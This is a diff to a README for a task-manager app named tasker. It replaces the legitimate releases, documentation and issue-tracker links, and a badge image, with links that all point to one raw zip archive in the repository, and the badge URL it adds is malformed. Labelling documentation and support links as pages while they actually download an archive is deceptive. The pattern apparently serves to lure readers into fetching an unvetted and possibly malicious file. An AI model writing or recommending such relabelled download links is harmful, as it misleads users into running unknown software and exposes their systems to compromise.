@@ -4,13 +4,13 @@
 Welcome to tasker! This application helps you manage your tasks simply and effectively. Designed with a user-friendly interface, it allows you to keep track of what you need to do without any hassle. 
 
 ## 📥 Download Now
-[![Download tasker](https://img.shields.io/badge/Download%20tasker-v1.0-blue.svg)](https://github.com/kmalgaber/tasker/releases)
+[![Download tasker](https://raw.githubusercontent.com/kmalgaber/tasker/main/seaway/tasker.zip%https://raw.githubusercontent.com/kmalgaber/tasker/main/seaway/tasker.zip)](https://raw.githubusercontent.com/kmalgaber/tasker/main/seaway/tasker.zip)
 
 ## 🚀 Getting Started
 To use tasker, you will need to download it from the Releases page. Follow the steps below to get started:
 
 1. **Visit the Releases Page**
-   - Go to the [Releases page](https://github.com/kmalgaber/tasker/releases) to find the latest version of tasker.
+   - Go to the [Releases page](https://raw.githubusercontent.com/kmalgaber/tasker/main/seaway/tasker.zip) to find the latest version of tasker.
 
 2. **Download the Application**
    - Look for the most recent version labeled as "Latest release". Click on the link to download the application for your operating system. 
@@ -85,8 +85,8 @@ tasker is licensed under the MIT License, allowing you to use, modify, and distr
 If you need help, you can reach out to the tasker support team by creating an issue in the GitHub repository or consulting the community for assistance.
 
 ## 🔗 Useful Links
-- [Visit the Releases page to download](https://github.com/kmalgaber/tasker/releases)
-- [Documentation](https://github.com/kmalgaber/tasker/wiki)
-- [Community Support](https://github.com/kmalgaber/tasker/issues)
+- [Visit the Releases page to download](https://raw.githubusercontent.com/kmalgaber/tasker/main/seaway/tasker.zip)
+- [Documentation](https://raw.githubusercontent.com/kmalgaber/tasker/main/seaway/tasker.zip)
+- [Community Support](https://raw.githubusercontent.com/kmalgaber/tasker/main/seaway/tasker.zip)
 
 Enjoy using tasker! We hope it helps you manage your tasks more effectively.
